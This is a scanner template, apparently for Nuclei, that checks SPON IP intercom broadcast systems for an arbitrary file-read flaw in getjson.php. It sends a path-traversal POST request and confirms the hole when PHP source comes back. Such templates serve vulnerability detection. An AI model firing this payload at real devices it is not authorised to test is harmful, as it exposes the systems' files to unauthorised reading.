id: poc-yaml-spon-php-getjson-fileread
info:
  name: "世邦通信SPON IP网络对讲广播系统 getjson.php 任意文件读取漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 世邦通信
  metadata:
    finger: IP\u7F51\u7EDC\u5BF9\u8BB2\u5E7F\u64AD\u7CFB\u7EDF
http:
  - raw:
      - |
        POST /php/getjson.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        jsondata[filename]=../php/getjson.php
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<?php"
          - "$_POST"
          - "\"data\""
          - "file_get_contents($fullpath)"
